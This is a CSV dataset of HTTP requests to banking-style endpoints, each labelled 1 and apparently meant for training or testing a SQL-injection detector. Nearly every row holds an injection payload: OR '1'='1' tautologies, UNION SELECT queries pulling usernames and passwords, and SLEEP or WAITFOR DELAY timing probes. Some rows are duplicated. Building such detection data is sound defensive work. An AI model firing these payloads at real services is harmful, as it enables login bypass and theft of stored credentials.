payload,label
POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=pass123,1
"POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=12345' UNION SELECT null, username, password FROM users --&to_account=67890&amount=1000",1
POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=56789' AND '1'='1' --&amount=15000&term=12,1
"POST /user/register HTTP/1.1\nContent-Type: application/json\nemail=admin@example.com' UNION SELECT null, username, password FROM users --&password=newpass",1
POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=1001' OR '1'='1' --&to_account=1002&amount=500,1
"POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=xyz789' UNION SELECT null, username, password FROM users --&amount=1000",1
POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=98765' AND '1'='1' --&balance=5000,1
POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=11111' OR '1'='1' --&to_account=22222&amount=2000,1
"POST /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=7777' UNION SELECT null, username, password FROM users --&status=completed",1
POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=321' AND '1'='1' --&approved=true,1
"POST /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=12345' UNION SELECT null, username, password FROM users --&reason=error",1
POST /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=54321' AND '1'='1' --&notification=true,1
"POST /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=9999' UNION SELECT null, username, password FROM users --&confirm=true",1
POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=1001' AND '1'='1' --&status=completed,1
"POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=222' UNION SELECT null, username, password FROM users --&status=failed",1
POST /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=333' AND '1'='1' --&password=updatedpassword,1
"POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=555' UNION SELECT null, username, password FROM users --&status=approved",1
POST /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=444' AND '1'='1' --&expiry_date=12/23,1
"POST /account/deposit HTTP/1.1\nContent-Type: application/json\naccount_id=2222' UNION SELECT null, username, password FROM users --&amount=1000",1
POST /transaction/verify HTTP/1.1\nContent-Type: application/json\ntransaction_id=1111' AND '1'='1' --&verify=true,1
"PUT /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=7777' UNION SELECT null, username, password FROM users --&balance=10000",1
PUT /user/settings HTTP/1.1\nContent-Type: application/json\nuser_id=65432' AND '1'='1' --&notification=false,1
"PUT /loan/update HTTP/1.1\nContent-Type: application/json\nloan_id=666' UNION SELECT null, username, password FROM users --&amount=20000",1
PUT /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=3333' AND '1'='1' --&status=pending,1
"PUT /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=112233' UNION SELECT null, username, password FROM users --&amount=1200",1
PUT /funds/modify HTTP/1.1\nContent-Type: application/json\naccount_id=12121' AND '1'='1' --&amount=500,1
"PUT /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=98765' UNION SELECT null, username, password FROM users --&email=newemail@example.com",1
PUT /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=4321' AND '1'='1' --&amount=15000,1
"PUT /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=999' UNION SELECT null, username, password FROM users --&expiry_date=12/24",1
PUT /transaction/status HTTP/1.1\nContent-Type: application/json\ntransaction_id=2222' AND '1'='1' --&status=completed,1
PUT /payment/modify HTTP/1.1\nContent-Type: application/json\npayment_id=4567' AND '1'='1' --&status=failed,1
"PUT /account/modify HTTP/1.1\nContent-Type: application/json\naccount_id=67890' UNION SELECT null, username, password FROM users --&account_type=savings",1
PUT /user/modify HTTP/1.1\nContent-Type: application/json\nuser_id=1122' AND '1'='1' --&password=newpassword,1
"PUT /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=888' UNION SELECT null, username, password FROM users --&approved=true",1
PUT /funds/update HTTP/1.1\nContent-Type: application/json\naccount_id=54321' AND '1'='1' --&amount=2500,1
"PUT /card/modify HTTP/1.1\nContent-Type: application/json\ncard_id=321' UNION SELECT null, username, password FROM users --&expiry_date=09/25",1
PUT /account/status HTTP/1.1\nContent-Type: application/json\naccount_id=5678' AND '1'='1' --&status=active,1
DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1001' OR '1'='1' --&confirm=true,1
"DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=555' UNION SELECT null, username, password FROM users --&reason=fraud",1
DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=2222' AND '1'='1' --&confirm=true,1
DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=10000' OR '1'='1' --&reason=duplicate,1
"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=5555' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1111' AND '1'='1' --&reason=wrong_amount,1
"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=6666' UNION SELECT null, username, password FROM users --&confirm=true",1
DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=7777' AND '1'='1' --&reason=lost,1
"DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' UNION SELECT null, username, password FROM users --&reason=error",1
DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=4321' AND '1'='1' --&reason=duplicate,1
"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=2345' UNION SELECT null, username, password FROM users --&reason=paid_off",1
DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=9999' AND '1'='1' --&confirm=true,1
"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=1010' UNION SELECT null, username, password FROM users --&reason=system_error",1
DELETE /account/deactivate HTTP/1.1\nContent-Type: application/json\naccount_id=555' AND '1'='1' --&reason=inactive,1
"DELETE /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_id=12345' UNION SELECT null, username, password FROM users --&reason=error",1
DELETE /user/delete HTTP/1.1\nContent-Type: application/json\nuser_id=444' AND '1'='1' --&reason=close_account,1
"DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=888' UNION SELECT null, username, password FROM users --&reason=withdrawal_error",1
DELETE /loan/close HTTP/1.1\nContent-Type: application/json\nloan_id=999' AND '1'='1' --&reason=fully_paid,1
"DELETE /card/cancel HTTP/1.1\nContent-Type: application/json\ncard_id=333' UNION SELECT null, username, password FROM users --&reason=theft",1
DELETE /transaction/rollback HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=double_entry,1
DELETE /account/remove HTTP/1.1\nContent-Type: application/json\naccount_id=1001' OR '1'='1' --&confirm=true,1
"DELETE /payment/delete HTTP/1.1\nContent-Type: application/json\npayment_id=555' UNION SELECT null, username, password FROM users --&reason=fraud",1
DELETE /user/deactivate HTTP/1.1\nContent-Type: application/json\nuser_id=2222' AND '1'='1' --&confirm=true,1
DELETE /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=10000' OR '1'='1' --&reason=duplicate,1
"DELETE /loan/cancel HTTP/1.1\nContent-Type: application/json\nloan_id=5555' UNION SELECT null, username, password FROM users --&reason=change_of_plan",1
DELETE /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=1111' AND '1'='1' --&reason=wrong_amount,1
"DELETE /account/close HTTP/1.1\nContent-Type: application/json\naccount_id=6666' UNION SELECT null, username, password FROM users --&confirm=true",1
DELETE /card/remove HTTP/1.1\nContent-Type: application/json\ncard_id=7777' AND '1'='1' --&reason=lost,1
"DELETE /transaction/delete HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' UNION SELECT null, username, password FROM users --&reason=error",1
DELETE /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_ref=4321' AND '1'='1' --&reason=duplicate,1
"DELETE /loan/terminate HTTP/1.1\nContent-Type: application/json\nloan_id=2345' UNION SELECT null, username, password FROM users --&reason=paid_off",1
DELETE /user/remove HTTP/1.1\nContent-Type: application/json\nuser_id=9999' AND '1'='1' --&confirm=true,1
"DELETE /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=1010' UNION SELECT null, username, password FROM users --&reason=system_error",1
DELETE /account/deactivate HTTP/1.1\nContent-Type: application/json\naccount_id=555' AND '1'='1' --&reason=inactive,1
"DELETE /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_id=12345' UNION SELECT null, username, password FROM users --&reason=error",1
DELETE /user/delete HTTP/1.1\nContent-Type: application/json\nuser_id=444' AND '1'='1' --&reason=close_account,1
"DELETE /funds/remove HTTP/1.1\nContent-Type: application/json\nfund_id=888' UNION SELECT null, username, password FROM users --&reason=withdrawal_error",1
DELETE /loan/close HTTP/1.1\nContent-Type: application/json\nloan_id=999' AND '1'='1' --&reason=fully_paid,1
"DELETE /card/cancel HTTP/1.1\nContent-Type: application/json\ncard_id=333' UNION SELECT null, username, password FROM users --&reason=theft",1
DELETE /transaction/rollback HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND '1'='1' --&reason=double_entry,1
POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' AND SLEEP(5) --&password=pass123,1
POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=12345' AND 1=1 WAITFOR DELAY '0:0:5' --&to_account=67890&amount=1000,1
POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=67890' AND SLEEP(5) --&to_account=11111&amount=1000,1
POST /user/reset_password HTTP/1.1\nContent-Type: application/json\nuser_id=1001' AND 1=1 WAITFOR DELAY '0:0:5' --&new_password=newpass123,1
POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=555' AND SLEEP(5) --&amount=15000&term=12,1
POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=2222' AND 1=1 WAITFOR DELAY '0:0:5' --&balance=5000,1
POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=7890' AND SLEEP(5) --&amount=1000,1
POST /transaction/verify HTTP/1.1\nContent-Type: application/json\ntransaction_id=1234' AND 1=1 WAITFOR DELAY '0:0:5' --&status=completed,1
POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=10000' AND 1=1 WAITFOR DELAY '0:0:5' --&to_account=99999&amount=2000,1
POST /loan/modify HTTP/1.1\nContent-Type: application/json\nloan_id=1234' AND 1=1 WAITFOR DELAY '0:0:5' --&amount=10000,1
POST /payment/cancel HTTP/1.1\nContent-Type: application/json\npayment_id=888' AND SLEEP(5) --&reason=fraud,1
POST /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=5678' AND SLEEP(5) --&reason=duplicate,1
POST /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=3333' AND 1=1 WAITFOR DELAY '0:0:5' --&expiry_date=12/23,1
POST /user/update HTTP/1.1\nContent-Type: application/json\nuser_id=789' AND SLEEP(5) --&email=newemail@example.com,1
POST /account/overview HTTP/1.1\nContent-Type: application/json\naccount_id=5555' AND 1=1 WAITFOR DELAY '0:0:5' --&balance=1000,1
POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=7777' AND SLEEP(5) --&status=approved,1
POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=4444' AND SLEEP(5) --&status=completed,1
POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=8888' AND SLEEP(5) --&status=failed,1
POST /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=123' AND SLEEP(5) --&amount=500,1
POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=2222' AND SLEEP(5) --&approved=true,1
POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' AND 1=1 WAITFOR DELAY '0:0:5' --&password=password,1
POST /transaction/revert HTTP/1.1\nContent-Type: application/json\ntransaction_id=777' AND 1=1 WAITFOR DELAY '0:0:5' --&status=reverted,1
POST /account/deposit HTTP/1.1\nContent-Type: application/json\naccount_id=2222' AND SLEEP(5) --&amount=5000,1
POST /payment/revert HTTP/1.1\nContent-Type: application/json\npayment_id=3333' AND SLEEP(5) --&status=error,1
GET /user/login?username=admin' OR '1'='1' -- HTTP/1.1,1
GET /account/overview?account_id=1001' OR '1'='1' -- HTTP/1.1,1
GET /transaction/details?transaction_id=1234' OR '1'='1' -- HTTP/1.1,1
GET /loan/apply?loan_id=555' OR '1'='1' -- HTTP/1.1,1
GET /user/profile?user_id=999' OR '1'='1' -- HTTP/1.1,1
GET /payment/status?payment_ref=333' OR '1'='1' -- HTTP/1.1,1
GET /funds/transfer?from_account=111' OR '1'='1' -- HTTP/1.1,1
GET /transaction/history?account_id=888' OR '1'='1' -- HTTP/1.1,1
GET /loan/details?loan_id=777' OR '1'='1' -- HTTP/1.1,1
GET /account/statement?account_id=666' OR '1'='1' -- HTTP/1.1,1
GET /user/reset_password?user_id=444' OR '1'='1' -- HTTP/1.1,1
GET /payment/update?payment_id=222' OR '1'='1' -- HTTP/1.1,1
GET /loan/status?loan_id=555' OR '1'='1' -- HTTP/1.1,1
GET /card/update?card_id=999' OR '1'='1' -- HTTP/1.1,1
GET /transaction/cancel?transaction_id=111' OR '1'='1' -- HTTP/1.1,1
GET /account/modify?account_id=222' OR '1'='1' -- HTTP/1.1,1
GET /user/logout?user_id=555' OR '1'='1' -- HTTP/1.1,1
GET /payment/verify?payment_ref=3333' OR '1'='1' -- HTTP/1.1,1
GET /loan/approve?loan_id=4444' OR '1'='1' -- HTTP/1.1,1
GET /funds/withdraw?account_id=1111' OR '1'='1' -- HTTP/1.1,1
POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=password123,1
POST /account/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=1234' OR '1'='1' --&to_account=6789&amount=1000,1
POST /loan/apply HTTP/1.1\nContent-Type: application/json\nloan_id=555' OR '1'='1' --&amount=15000&term=12,1
POST /user/reset_password HTTP/1.1\nContent-Type: application/json\nuser_id=12345' OR '1'='1' --&new_password=newpassword,1
POST /transaction/initiate HTTP/1.1\nContent-Type: application/json\nfrom_account=111' OR '1'='1' --&to_account=222&amount=500,1
POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=6789' OR '1'='1' --&amount=2000,1
POST /funds/transfer HTTP/1.1\nContent-Type: application/json\nfrom_account=100' OR '1'='1' --&to_account=200&amount=500,1
POST /user/login HTTP/1.1\nContent-Type: application/json\nusername=admin' OR '1'='1' --&password=adminpassword,1
POST /loan/approve HTTP/1.1\nContent-Type: application/json\nloan_id=3333' OR '1'='1' --&approved=true,1
POST /transaction/cancel HTTP/1.1\nContent-Type: application/json\ntransaction_id=5555' OR '1'='1' --&reason=error,1
POST /payment/update HTTP/1.1\nContent-Type: application/json\npayment_id=4444' OR '1'='1' --&status=completed,1
POST /card/update HTTP/1.1\nContent-Type: application/json\ncard_id=1234' OR '1'='1' --&expiry_date=12/23,1
POST /user/profile HTTP/1.1\nContent-Type: application/json\nuser_id=5678' OR '1'='1' --&email=admin@example.com,1
POST /account/update HTTP/1.1\nContent-Type: application/json\naccount_id=9999' OR '1'='1' --&balance=2000,1
POST /payment/verify HTTP/1.1\nContent-Type: application/json\npayment_ref=7890' OR '1'='1' --&amount=1500,1
POST /loan/details HTTP/1.1\nContent-Type: application/json\nloan_id=1111' OR '1'='1' --&status=approved,1
POST /funds/withdraw HTTP/1.1\nContent-Type: application/json\naccount_id=4444' OR '1'='1' --&amount=500,1
POST /transaction/update HTTP/1.1\nContent-Type: application/json\ntransaction_id=2222' OR '1'='1' --&status=completed,1
POST /loan/status HTTP/1.1\nContent-Type: application/json\nloan_id=7777' OR '1'='1' --&status=repaid,1
POST /account/overview HTTP/1.1\nContent-Type: application/json\naccount_id=666' OR '1'='1' --&balance=500,1
